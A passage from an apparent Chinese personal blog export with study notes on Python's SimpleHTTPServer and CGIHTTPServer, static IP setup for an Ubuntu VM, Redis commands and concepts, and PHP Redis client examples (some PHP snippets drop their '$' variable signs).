server.serve_forever()
```

![image-20220613233010856](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/1b0b1c04a6c48343160b3079b27564cf-9336656.png)

### SimpleHTTPServer: 使用静态文件来回应请求

HTTP协议基于TCP协议，但增加了更多的规范。这些规范，虽然限制了TCP协议的功能，但大大提高了信息封装和提取的方便程度。

对于一个HTTP请求(request)来说，它包含有两个重要信息：请求方法和URL。

| 请求方法(request method) | URL        | 操作                                                         |
| ------------------------ | ---------- | ------------------------------------------------------------ |
| GET                      | /          | 发送text_content                                             |
| GET                      | /ni9ne.png | 发送pic_content                                              |
| POST                     | /          | 分析request主体中包含的value(实际上是我们填入表格的内容); 发送text_content和value |

可以使用`SimpleHTTPServer`包和`CGIHTTPServer`包来规定针对不同请求的操作。

其中，SimpleHTTPServer可以用于处理GET方法和HEAD方法的请求。它读取request中的URL地址，找到对应的**静态文件**，分析文件类型，用HTTP协议将文件发送给客户。

![image-20220614002623225](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/66f24a87d93f2ac0054c324b94deedf5-3d53f73.png)

**index.html** 

```html
<head>
<title>NI9NE</title>
</head>
<html>
<p> This is NI9NE's Python Http Server</p>
<img src='ni9ne.png'/>
<form name="input" action="/" method="post">
first name: <input type="text" name="firstname"><br/>
<input type="submit" value="Submit">
</form>
</html>
```

**socket_simplehttp.py** 

```python
# coding=utf8

import SocketServer as socketserver
import SimpleHTTPServer

HOST = ''
PORT = 8086

# 创建服务, SimpleHTTPRequestHander是SimpleHTTPServer包中预设
server = socketserver.TCPServer((HOST,PORT), SimpleHTTPServer.SimpleHTTPRequestHandler)
# 开始服务
server.serve_forever()
```

![image-20220614003048310](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7e7056e171bf623e9a0af7e1bce4dc26-5ce3bc6.png)

这里的程序**不能处理POST请求**。可以使用使用CGI来弥补这个缺陷。

![image-20220614003031673](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/73a828e31c424b057c841425a25c6842-97d5e27.png)

### CGIHTTPServer：使用静态文件或者CGI来回应请求

```
文档: 
https://docs.python.org/zh-cn/3/library/http.server.html#http.server.CGIHTTPRequestHandler
https://docs.python.org/zh-cn/3/library/http.server.html#http.server.SimpleHTTPRequestHandler
```



`CGIHTTPServer`包中的`CGIHTTPRequestHandler`类继承自`SimpleHTTPRequestHandler`类，所以可以用来代替上面的例子，来提供静态文件的服务。此外，`CGIHTTPRequestHandler`类还可以用来运行**CGI脚本**。

**CGI** (Common Gateway Interface)。CGI是服务器和应用脚本之间的一套接口标准。它的功能是让服务器程序运行**脚本程序**，将**程序的输出**作为response发送给客户。总体的效果，是允许服务器动态的生成回复内容，而不必局限于静态文件。

支持CGI的服务器程接收到客户的请求，根据请求中的URL，运行对应的脚本文件。服务器会将HTTP请求的信息和socket信息传递给脚本文件，并等待脚本的输出。脚本的输出封装成合法的HTTP回复，发送给客户。

服务器和CGI脚本之间的通信要符合CGI标准。CGI的实现方式有很多，比如说使用Apache服务器与Perl写的CGI脚本，或者Python服务器与shell写的CGI脚本。

为了使用CGI，需要使用`BaseHTTPServer`包中的**HTTPServer**类来构建服务器。

![image-20220614010142853](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/cc7249a73cd86b19a71265af90ecce1c-269bda1.png)

**index.html**

CGIHTTPRequestHandler默认当前目录下的cgi-bin和ht-bin文件夹中的文件为CGI脚本，而存放于其他地方的文件被认为是静态文件。因此，我们需要修改一下index.html，将其中form元素指向的action改为cgi-bin/post.py。

```html
<head>
<title>NI9NE</title>
</head>
<html>
<p> This is NI9NE's Python Http Server</p>
<img src='ni9ne.png'/>
<form name="input" action="cgi-bin/post.py" method="post">
first name: <input type="text" name="firstname"><br/>
<input type="submit" value="Submit">
</form>
</html>
```

**CGIHTTPServer.py**

```python
#! /usr/bin/python
# coding=utf8

import BaseHTTPServer
import CGIHTTPServer

HOST = ''
PORT = 8086

server = BaseHTTPServer.HTTPServer((HOST,PORT), CGIHTTPServer.CGIHTTPRequestHandler)
server.serve_forever()
```

**post.py**

```python
#! /usr/bin/python
# coding=utf8

import cgi
form = cgi.FieldStorage()

print("Content-Type: text/html")
print('')
print("<p>Hello world!</p>")
print("<p>" +  repr(form['firstname']) + "</p>")
```

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>VM虚拟机固定IP配置</title>
    <url>/2022/01/19/%E6%9D%82%E9%A1%B9%E6%93%8D%E4%BD%9C/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%9B%BA%E5%AE%9Aip/</url>
    <content><![CDATA[
## VM虚拟机固定IP配置

### 环境:

VMware Workstation 16 Pro

ubuntu 18.16.6 LTS

### 步骤:

#### 1.配置虚拟机网络为NAT模式

![image-20220604173036356](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ba9eb81f2e10dc4c463239f6ab3a8607-fe70bd1.png)

#### 2.查看本机子网地址

```powershell
ipconfig
```

![image-20220604173326567](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/51fd16fa99cfa68ad645a1d83627de3a-e833663.png)

> VMnet8即为虚拟机使用网卡

#### 3.配置VM虚拟网络

![image-20220604173437247](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9895c5c1ddffb2fe7eb44e6bec42172c-c5bc411.png)

#### 4.修改ubuntu系统网络配置

```shell
$ sudo vi /etc/netplan/00-installer-config.yaml
```

修改文件为:

```yaml
# This is the network config written by 'subiquity'
network:
  ethernets:
    ens33:
      dhcp4: true
      addresses: [192.168.253.138/24]	# 指定固定子网IP
      optional: true
      gateway4: 192.168.253.2	# 固定子网网关
      nameservers:
        addresses: [8.8.8.8,114.114.114.114]	# DNS服务, 若无, 无法正常使用apt解析域名
  version: 2
```

应用修改

```shell
$ sudo netplan apply
```

#### 5.查看当前IP

```shell
$ ifconfig	# 任选一种
$ ip addr
```

![image-20220604174023765](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/d1fbcab231f99d9afc9252cb6e466575-22a9c74.png)

]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis-使用</title>
    <url>/2018/09/22/Redis/Redis%20%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[
## 安装

```sudo apt-get install redis-server```

## 进入cli控制台

```redis-cli```

## str命令讲解

**set**
```set key value```

setnx  设置k  防止重复 .如果重复会直接返回0

```
setnx key value
```

setex 设置一个k  并且给有效期    expire
用法: setex k 生成时间(秒单位) v

```
setex key int(秒单位) value
```

ttl 以秒为单位返回 key的剩余生存时间
	key 不存在 -2
	key 存在没有设定时间  -1
	key 存在设定过期时间   返回剩余时间

```
ttl key
```

```
127.0.0.1:6379> set name yinkai
OK

127.0.0.1:6379> get name
"yinkai"

127.0.0.1:6379> set yinkai
(error) ERR wrong number of arguments for 'set' command
127.0.0.1:6379> set name anjing
OK
127.0.0.1:6379> get name
"anjing"
127.0.0.1:6379> setnx name yinkai
(integer) 0
127.0.0.1:6379> get name
"anjing"
127.0.0.1:6379> setnx age 18
(integer) 0
127.0.0.1:6379> setnx anage 18
(integer) 1
127.0.0.1:6379> get anage
"18"
127.0.0.1:6379> setex run 10 yinkaipaoyipao
OK
127.0.0.1:6379> get run
"yinkaipaoyipao"
127.0.0.1:6379> get run
(nil)
127.0.0.1:6379> setex action 30 macbookpro_2kuai
OK
127.0.0.1:6379> get action
"macbookpro_2kuai"
127.0.0.1:6379> ttl action
(integer) -2
127.0.0.1:6379> setex action 30 macbookpro_2kuai
OK
127.0.0.1:6379> ttl action
(integer) 28
127.0.0.1:6379> ttl action
(integer) 27
127.0.0.1:6379> ttl action
(integer) 26
127.0.0.1:6379> ttl action
(integer) 25
127.0.0.1:6379> ttl action
(integer) 24
127.0.0.1:6379> ttl name
(integer) -1
127.0.0.1:6379> 
```

------

批量设置 
mset k1 v1 k2 v2 k3 v3........

批量获取
mget k1 k2 k3 k4.......

```
127.0.0.1:6379> mset name luo age 18 sex 110
OK
127.0.0.1:6379> get sex
"110"
127.0.0.1:6379> mget name sex age
1) "luo"
2) "110"
3) "18"



```

批量设置不存在的 键和值(当其中有key不存在,则直接失败.)
msetnx k1 v1 k2 v2 k3 v3........

#### 1.str命令

**浏览量**(++ --)

```
incr  自增+1 返回自增之后的结果
decr  自减-1 返回自减之后的结果

incrby 键名 数值 (增加指定数量)
	(若该字段不存在,则会先创建默认值为0的字段)
	eg:incrby age 100
decrby 键名 数值 (减去指定数量)
	eg:decrby age 100

del 键名 (删除指定键)
```

#### 2.hash命令

**存放二维数组**

```
hset 键名 字段 字段值
hget 键名 字段
```

**批量处理**
	hmset 键名 字段1 值1 字段2 值2 字段3 值3 ...
	hmget 键名 字段1 字段2 字段3 ...

**批量获取**
	hkeys 键名 (返回指定键名中的所有字段名)
	hvals 键名 (返回指定键名中的所有字段值)
	hlen  键名 (返回指定键值对中含有的段数量)

```
hgetall 键名 (返回指定键中所有的字段名+字段值)
```

**增删**
	hincrby 键名 字段名 数值 (给hash键红指定的整形字段添加数值)
		eg:hincrby 001 age 10

```
hdel 键名 字段1 字段2 字段3 ....(删除指定字段)
	eg: hdel 001 age name 
```

------

**del 和 hdel 区别**
	del 删除一整个价值对

​	hdel 只删除某个键值对的一个字段

hash小结
hset
hmset
hdel  del
hget hmget  hgetall hkeys hvals
hincrby
判断:hexists
	hexists 键名 字段名   (查询指定键值对中是否存在该字段, 存在返回1,不存在返回0)

<hr/>
list 是链表

特点是 :  有序  队列

先进后出

------

#### 3.链表命令

**创建插入**
	lpush 从队列左边插入数据
	rpush 从队列右边插入数据

**从左到右显示**
	lrange 键名 起始下标 终止下标  
			(从队列中获取指定的值,从左边开始)

------

**下标指定**: 0 第一个 1 第二个

​		 	-1 最后一个  -2 倒数第二个

**指定位置插入**
	linsert 键名 after|before 原值 新值

**删除指定元素**

​	lrem 键名 数量&方向 值 (删除指定数量的指定值,返回删除的数量)

```
n > 0 从头向尾搜索,删除 n 个元素
n < 0 从尾向头搜索,删除 n 的绝对值个元素
n = 0 删除所有指定值得元素
```

------

**提取链表中信息**
	lindex 键名 下标 (提取列表中指定下标的元素的值) 

```
llen 键名  (获取列表的长度)
```

**设置链表信息**
	lset 键名 下标 内容 (设置指定下标内容,返回ok)

**删除元素(首尾)**
	lpop 键名 (左边删除一个元素,返回被删除的元素)
	rpop 键名 (右边删除一个元素,返回被删除的元素)

```
ltrim 键名 起始下标 截止下标  (截取指定首尾下标的元素)

rpoplpush 键名 源队列 目标队列  (从源队列右边移除最后一元素, 放入一个另一个队列的首部)
eg:
	127.0.0.1:6379> lrange list 0 -1
	7
	6
	5
	4
	3
	127.0.0.1:6379> lrange rlist 0 -1
	1
	2
	3
	4
	5
	6
	127.0.0.1:6379> rpoplpush list rlist
	3
	127.0.0.1:6379> lrange rlist 0 -1
	3
	1
	2
	3
	4
	5
	6
	127.0.0.1:6379> lrange list 0 -1
	7
	6
	5
	4
```

<hr/>
set 集合(string类型的无序集合,成员唯一)

```
集合中包含交集,并集,差集
(适用于推荐算法的实现)
```

####4.set命令

sadd 集合名 元素1 元素2 元素3 ...  (将一个或多个成员元素添加入集合)

smembers 集合名 (显示集合中所有的子元素)

srem 集合名 元素1 元素2 ...   (删除指定集合中一个或多个元素)

spop 集合名  (随机删除一个元素,并且返回删除的元素名)

sismember 集合名 元素  (判断指定元素是否在集合中,返回0/1)

scard 集合名 (统计集合元素的个数)

smove 来源集合 目标集合 元素 (将一个集合中的元素移动到另一个集合)

srandmember 集合名 [count] (返回一个或指定个随机元素组成的集合)

##### set 无序集合

1. **差集**
   sdiff 集合1  集合2 
   返回 集合1  集合2 的差集  以集合1 为主



```
127.0.0.1:6379> flushdb
OK
127.0.0.1:6379> sadd s85 1 2 3 4 5 6 7
(integer) 7
127.0.0.1:6379> sadd s86 6 7 8 9 
(integer) 4
127.0.0.1:6379> sdiff s85 s86
1) "1"
2) "2"
3) "3"
4) "4"
5) "5"
127.0.0.1:6379> sdiff s86 s85
1) "8"
2) "9"
127.0.0.1:6379> sdiffstore diff_s s85 s86
(integer) 5
127.0.0.1:6379> smembers diff_s
1) "1"
2) "2"
3) "3"
4) "4"
5) "5"
127.0.0.1:6379> 

```

------

2. **并集**
   sunion 集合1  集合2    并集

```
127.0.0.1:6379> sunion s85 s86
1) "1"
2) "2"
3) "3"
4) "4"
5) "5"
6) "6"
7) "7"
8) "8"
9) "9"
127.0.0.1:6379> sunionstore uni_s s85 s86
(integer) 9
127.0.0.1:6379> smembers uni_s
1) "1"
2) "2"
3) "3"
4) "4"
5) "5"
6) "6"
7) "7"
8) "8"
9) "9"
127.0.0.1:6379> 


```

------

3. **交集**
   sinter 集合1  集合2   交集

```
127.0.0.1:6379> smembers s85
1) "1"
2) "2"
3) "3"
4) "4"
5) "5"
6) "6"
7) "7"
127.0.0.1:6379> smembers s86
1) "6"
2) "7"
3) "8"
4) "9"
127.0.0.1:6379> sinter s85 s86
1) "6"
2) "7"
127.0.0.1:6379> sinter s86 s85
1) "6"
2) "7"
127.0.0.1:6379> sinterstore inter_s s85 s86
(integer) 2
127.0.0.1:6379> smembers inter_s
1) "6"
2) "7"
127.0.0.1:6379> 


```

------

4. store 存储结果集合

sdiffstore 新集合 集合1  集合2
把返回结果 写入新集合

sinterstore 新集合 集合1  集合2
把返回结果 写入新集合

sunionstore 新集合 集合1  集合2
把返回结果 写入新集合

smove 原集合 目标集合 值
把指定的值 从源集合 中 移动到目标集合

------

##### zset 有序集合

**区别**: set 无序  zset 有序

有序是如何有序的?
	使用 "分数"  .
	有序集合 给每一个元素 设定 "分数"

zadd key 分数1 v1 分数2 v2 分数3 v3 ......

zrange 集合 起始下标 截止下标 [withscores]

```
0 第一个   -1  最后一个
得到所有 0 -1

返回集合中  指定下标区间内元素
如果 加了 withscores  则 连分数一起返回

按照分数排序 **从小到大**
```

```
127.0.0.1:6379> zadd z85 120 yinkai 160 jq 170 xin 175 kui
(integer) 4
127.0.0.1:6379> zrange z85 0 -1
1) "yinkai"
2) "jq"
3) "xin"
4) "kui"
127.0.0.1:6379> zrange z85 0 -1 withscores
1) "yinkai"
2) "120"
3) "jq"
4) "160"
5) "xin"
6) "170"
7) "kui"
8) "175"

```

------

zrevrange 集合 起始下标 截止下标 [withscores]

```
0 第一个   -1  最后一个
得到所有 0 -1

返回集合中  指定下标区间内元素
如果 加了 withscores  则 连分数一起返回

按照分数排序 **从大到小**
```

------

zrem key 值1 [值2 .....]
删除   集合中 指定的值

zincrby key 增量 值
给 集合中指定值得分数(score) 加上 增量   

zrank key 值  
返回集合中指定值的下标  按照 (score)从小到大排序

zrevrank key 值
返回集合中指定值的下标  按照 (score)从大到小排序

zcount key 起始分数  截至分数
统计 该集合 score 在给定分数区间内的元素个数

zcard key
返回集合元素个数



zinterstore key 取交集集合个数 集合1 集合2  [集合3....]
交集 存新集合

zunionstore 取并集集合个数 集合1 集合2  [集合3....]
并集存新集合

总结 :

1. **区别**
        是否允许重复元素   是否有序   有序的实现方式      应用场景
   集合               F                         F                null                     社交 好友推荐等
   有序集合        F                         T                分数                    排行榜 
   列表               T                         T                索引下标             队列 抽奖

2. **使用场景**

string
	计数器
	系统缓存(把对象 数组 串行化再存入string)

list
	队列
	最新N个数据
	实时分析正在发生的情况
	数据统计 
	防止垃圾邮件(set)

hash
	用户数据

set
	unique 操作 获取某段时间内所有数据的排重值
	共同好友  推荐好友
	统计网站访问的所有 独立IP(唯一性)
	实时反垃圾系统

zset
	排行榜(取 top N操作)
	需要 精准设定过期的应用(时间戳 score )

------

公司想要使用reids?怎么做?

第一步: 安装配置 redis
第二步: 安装配置 phpredis
第三步: 得知道基本的语句 5种数据类型  CURD操作

]]></content>
      <categories>
        <category>实际演练</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis-简介</title>
    <url>/2018/09/15/Redis/Redis%20%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[
# Redis

## 1.非关系型数据库 NoSQL

```
NoSQL（NoSQL = Not Only SQL），意即“不仅仅是SQL”，指的是非关系型的数据库。
是一项全新的数据库革命性运动，早期就有人提出，发展至2009年趋势越发高涨。
随着互联网web2.0网站的兴起，传统的关系数据库在应付web2.0网站，
特别是超大规模和高并发的SNS类型的web2.0纯动态网站已经显得力不从心，
暴露了很多难以克服的问题，NoSQL的拥护者们提倡运用非关系型的数据存储，
相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入。
而非关系型的数据库则由于其本身的特点得到了非常迅速的发展。
```

### Nosql特点

```
它们可以处理超大量的数据。

它们运行在便宜的PC服务器集群上。
    PC集群扩充起来非常方便并且成本很低，避免了“sharding”操作的复杂性和成本。
它们击碎了性能瓶颈。
    通过NoSQL架构可以省去将Web或Java应用和数据转换成SQL友好格式的时间，执行速度变得更快。
    “SQL并非适用于所有的程序代码，” 对于那些繁重的重复操作的数据，SQL值得花钱。
    但是当数据库结构非常简单时，SQL可能没有太大用处。
没有过多的操作。
    虽然NoSQL的支持者也承认关系数据库提供了无可比拟的功能集合，
    而且在数据完整性上也发挥绝对稳定，他们同时也表示，企业的具体需求可能没有那么多。
```

### NoSQL适用场景

```
1. 对数据高并发读写
2. 对海量数据的高效率存储和访问
3. 对数据的高可扩展性和高可用性
```

## 2.Redis

```
Redis is an open source, advanced key-value store.
It is often referred to as a data structure server since keys can contain
strings, hashes, lists, sets and sorted sets. 

Redis是一个开源的，先进的key-value存储。
它通常被称为数据结构服务器，因为键可以包含字符串，哈希，链表，集合和有序集合。
```

### Redis 简介

```
Redis 是完全开源免费的，遵守BSD协议，是一个高性能的key-value数据库。
Redis 与其他 key - value 缓存产品有以下三个特点：
Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。
Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。
Redis支持数据的备份，即master-slave模式的数据备份。
```

### Redis 优势

```
性能极高 – Redis能读的速度是110000次/s,写的速度是81000次/s 。
丰富的数据类型 – Redis支持二进制案例的 Strings, Lists, Hashes, Sets 及 Ordered Sets 数据类型操作
原子 – Redis的所有操作都是原子性的，同时Redis还支持对几个操作全并后的原子性执行。
丰富的特性 – Redis还支持 publish/subscribe, 通知, key 过期等等特性。
```

### Redis与其他key-value存储有什么不同？

```
Redis有着更为复杂的数据结构并且提供对他们的原子性操作，这是一个不同于其他数据库的进化路径。
Redis的数据类型都是基于基本数据结构的同时对程序员透明，无需进行额外的抽象。
Redis运行在内存中但是可以持久化到磁盘，所以在对不同数据集进行高速读写时需要权衡内存，
因为数据量不能大于硬件内存。在内存数据库方面的另一个优点是，相比在磁盘上相同的复杂的数据结构，
在内存中操作起来非常简单，这样Redis可以做很多内部复杂性很强的事情。
同时，在磁盘格式方面他们是紧凑的以追加的方式产生的，因为他们并不需要进行随机访问。
```

### Redis 安装

#### Window 下安装

```
下载地址：https://github.com/MSOpenTech/redis/releases。
Redis 支持 32 位和 64 位。这个需要根据你系统平台的实际情况选择，
这里我们下载 Redis-x64-xxx.zip压缩包到 C 盘，解压后，将文件夹重新命名为 redis。

打开一个 cmd 窗口 使用cd命令切换目录到 C:\redis 运行 redis-server.exe redis.windows.conf 。
如果想方便的话，可以把 redis 的路径加到系统的环境变量里，这样就省得再输路径了，
后面的那个 redis.windows.conf 可以省略，如果省略，会启用默认的。


这时候另启一个cmd窗口，原来的不要关闭，不然就无法访问服务端了。
切换到redis目录下运行 redis-cli.exe -h 127.0.0.1 -p 6379 。
设置键值对 set myKey abc
取出键值对 get myKey
```

#### Linux 下安装

下载地址：http://redis.io/download，下载最新文档版本。

本教程使用的最新文档版本为 3.0.0，下载并安装：

```
$ wget http://download.redis.io/releases/redis-3.0.0.tar.gz -O redis-3.0.0.tar.gz
$ tar xzf redis-3.0.0.tar.gz
$ cd redis-3.0.0
$ make
$ make PREFIX=/usr/local/redis install  （非必需）
```

如果失败可能为gcc没有安装。make完后目录下会出现编译后的redis服务程序redis-server。

注意：这种方式启动redis 使用的是默认配置。也可以通过启动参数告诉redis使用指定配置文件使用下面命令启动。

#### 配置redis使用环境：

```
新建目录 /usr/local/redis/etc ,
把原redis.conf 复制到该目录下

vim redis.conf
将 daemonize no 改为 yes   意为后台启动

启动服务
$ /usr/local/redis/bin/redis-server /usr/local/redis/etc/redis.conf
```

## Redis 数据类型

Redis常用的五种数据类型：

string（字符串），hash（哈希），list（列表），set（集合）及zset(sorted set 有序集合)。

详细格式看手册

#### String（字符串）

string是redis最基本的类型，你可以理解成与Memcached一模一样的类型，一个key对应一个value。

string类型是二进制安全的。意思是redis的string可以包含任何数据。比如jpg图片或者序列化的对象 。

string类型是Redis最基本的数据类型，一个键最大能存储512MB。

1. set
2. get
3. setnx
4. setex
5. setrange
6. getrange
7. mset
8. mget
9. msetnx
10. getset
11. incr
12. incrby
13. decr
14. decrby
15. append
16. strlen

#### Hash（哈希）

Redis hash 是一个键值对集合，一个string类型的field和value的映射表，hash特别适合用于存储对象。

1. hset
2. hget
3. hsetnx
4. hmset
5. hmget
6. hgetall
7. hexists
8. hlen
9. hkeys
10. hvals
11. hincrby
12. hdel

#### List（列表）

Redis 列表是简单的字符串列表，按照插入顺序排序。你可以添加一个元素到列表的头部（左边）或者尾部（右边）。

1. lpush
2. lrange
3. rpush
4. linsert
5. lset
6. lrem
7. ltrim
8. lpop
9. rpop
10. rpoplpush
11. lindex
12. llen

#### Set（无序集合）

Set是string类型的无序集合，通过哈希表实现的，所以添加，删除，查找的复杂度都是O(1)。

1. sadd
2. smembers
3. srem
4. spop
5. srandmember
6. scard
7. sismember
8. sdiff
9. sdiffstore
10. sinter
11. sinterstore
12. sunion
13. sunionstore
14. smove

#### zset(sorted set：有序集合)

zset 和 set 一样也是string类型元素的集合,且不允许重复的成员，不同的是每个元素都会关联一个double类型的分数。redis正是通过分数来为集合中的成员进行从小到大的排序。zset的成员是唯一的,但分数(score)却可以重复。

1. zadd
2. zrange
3. zrevrange
4. zrangebyscore
5. zrevrangebyscore
6. zrem
7. zcard
8. zcount
9. zincrby
10. zrank
11. zrevrank
12. zremrangebyrank
13. zremrangebyscore
14. zinterstore
15. zunionstore
16. zscore

### Others

1. keys
2. exists
3. del
4. expire
5. persist
6. ttl
7. select
8. move
9. randomkey
10. rename
11. type
12. ping
13. echo
14. quit
15. save
16. bgsave
17. dbsize
18. config get
19. info
20. flushdb
21. flushall

#### Redis命令（截至到3.2.8）共174个，此文只介绍常用的，还有很多的不常用命令在《Redis命令补充》中说明，此处不提



]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis-常用操作</title>
    <url>/2018/09/24/Redis/Redis%20%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[
## php操作redis常用方法

1.connect

描述：实例连接到一个Redis.
参数：host: string，port: int
返回值：BOOL 成功返回：TRUE;失败返回：FALSE
示例：

```
<?php  
redis = new redis();  
result = redis->connect('127.0.0.1', 6379);  
var_dump(result); //结果：bool(true)  
?>  
```

2，set
描述：设置key和value的值
参数：Key Value
返回值：BOOL 成功返回：TRUE;失败返回：FALSE
示例：

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
result = redis->set('test',"11111111111");  
var_dump($result);    //结果：bool(true)  
?>  
```

3，get
描述：获取有关指定键的值
参数：key
返回值：string或BOOL 如果键不存在，则返回 FALSE。否则，返回指定键对应的value值。
范例：

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
result = redis->get('test');  
var_dump($result);   //结果：string(11) "11111111111"  
?>  
```

4，delete

描述：删除指定的键
参数：一个键，或不确定数目的参数，每一个关键的数组：key1 key2 key3 … keyN
返回值：删除的项数
范例：

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->set('test',"1111111111111");  
echo redis->get('test');   //结果：1111111111111  
redis->delete('test');  
var_dump(redis->get('test'));  //结果：bool(false)  
?>  
```

5，setnx
描述：如果在数据库中不存在该键，设置关键值参数
参数：key value
返回值：BOOL 成功返回：TRUE;失败返回：FALSE
范例：

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->set('test',"1111111111111");  
redis->setnx('test',"22222222");  
echo redis->get('test');  //结果：1111111111111  
redis->delete('test');  
redis->setnx('test',"22222222");  
echo redis->get('test');  //结果：22222222  
?>  
```

6，exists
描述：验证指定的键是否存在
参数key
返回值：Bool 成功返回：TRUE;失败返回：FALSE
范例：

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->set('test',"1111111111111");  
var_dump(redis->exists('test'));  //结果：bool(true)  
?>  
```

7，incr
描述：数字递增存储键值键.
参数：key value：将被添加到键的值
返回值：INT the new value
实例：

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->set('test',"123");  
var_dump(redis->incr("test"));  //结果：int(124)  
var_dump($redis->incr("test"));  //结果：int(125)  
?>
 
```

8，decr
描述：数字递减存储键值。
参数：key value：将被添加到键的值
返回值：INT the new value
实例：

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->set('test',"123");  
var_dump(redis->decr("test"));  //结果：int(122)  
var_dump($redis->decr("test"));  //结果：int(121)  
?>
```

9，getMultiple
描述：取得所有指定键的值。如果一个或多个键不存在，该数组中该键的值为假
参数：其中包含键值的列表数组
返回值：返回包含所有键的值的数组
实例：

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->set('test1',"1");  
redis->set('test2',"2");  
result = redis->getMultiple(array('test1','test2'));  
print_r($result);   //结果：Array ( [0] => 1 [1] => 2 )  
?>
```

10，lpush
描述：由列表头部添加字符串值。如果不存在该键则创建该列表。如果该键存在，而且不是一个列表，返回FALSE。
参数：key,value
返回值：成功返回数组长度，失败false
实例：

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->delete('test');  
var_dump(redis->lpush("test","111"));   //结果：int(1)  
var_dump($redis->lpush("test","222"));   //结果：int(2)  
?>
```

11，rpush
描述：由列表尾部添加字符串值。如果不存在该键则创建该列表。如果该键存在，而且不是一个列表，返回FALSE。
参数：key,value
返回值：成功返回数组长度，失败false
范例：

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->delete('test');  
var_dump(redis->lpush("test","111"));   //结果：int(1)  
var_dump(redis->lpush("test","222"));   //结果：int(2)  
var_dump(redis->rpush("test","333"));   //结果：int(3)  
var_dump($redis->rpush("test","444"));   //结果：int(4)  
?>
```

12，lpop
描述：返回和移除列表的第一个元素
参数：key
返回值：成功返回第一个元素的值 ，失败返回false
范例：

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->delete('test');  
redis->lpush("test","111");  
redis->lpush("test","222");  
redis->rpush("test","333");  
redis->rpush("test","444");  
var_dump(redis->lpop("test"));  //结果：string(3) "222"  
?>
```

13，lsize,llen
描述：返回的列表的长度。如果列表不存在或为空，该命令返回0。如果该键不是列表，该命令返回FALSE。
参数：Key
返回值：成功返回数组长度，失败false
范例：

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->delete('test');  
redis->lpush("test","111");  
redis->lpush("test","222");  
redis->rpush("test","333");  
redis->rpush("test","444");  
var_dump(redis->lsize("test"));  //结果：int(4)  
?>
```

14，lget
描述：返回指定键存储在列表中指定的元素。 0第一个元素，1第二个… -1最后一个元素，-2的倒数第二…错误的索引或键不指向列表则返回FALSE。
参数：key index
返回值：成功返回指定元素的值，失败false
范例：

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->delete('test');  
redis->lpush("test","111");  
redis->lpush("test","222");  
redis->rpush("test","333");  
redis->rpush("test","444");  
var_dump(redis->lget("test",3));  //结果：string(3) "444"  
?>
```

15，lset
描述：为列表指定的索引赋新的值,若不存在该索引返回false.
参数：key index value
返回值：成功返回true,失败false
范例：

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->delete('test');  
redis->lpush("test","111");  
redis->lpush("test","222");  
var_dump(redis->lget("test",1));  //结果：string(3) "111"  
var_dump(redis->lset("test",1,"333"));  //结果：bool(true)  
var_dump(redis->lget("test",1));  //结果：string(3) "333"  
?>
```

16，lgetrange
描述：
返回在该区域中的指定键列表中开始到结束存储的指定元素，lGetRange(key, start, end)。0第一个元素，1第二个元素… -1最后一个元素，-2的倒数第二…
参数：key start end
返回值：成功返回查找的值，失败false
范例：

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->delete('test');  
redis->lpush("test","111");  
redis->lpush("test","222");  
print_r(redis->lgetrange("test",0,-1));  //结果：Array ( [0] => 222 [1] => 111 )  
?>
```

17,lremove
描述：从列表中从头部开始移除count个匹配的值。如果count为零，所有匹配的元素都被删除。如果count是负数，内容从尾部开始删除。
参数：key count value
返回值：成功返回删除的个数，失败false
范例：

```
<?php  
redis = new redis();  
redis->connect('127.0.0.1', 6379);  
redis->delete('test');  
redis->lpush('test','a');  
redis->lpush('test','b');  
redis->lpush('test','c');  
redis->rpush('test','a');  
print_r(redis->lgetrange('test', 0, -1)); //结果：Array ( [0] => c [1] => b [2] => a [3] => a )  
var_dump(redis->lremove('test','a',2));   //结果：int(2)  
print_r(redis->lgetrange('test', 0, -1)); //结果：Array ( [0] => c [1] => b )  
?>
```

18，sadd
描述：为一个Key添加一个值。如果这个值已经在这个Key中，则返回FALSE。
参数：key value
返回值：成功返回true,失败false
范例：

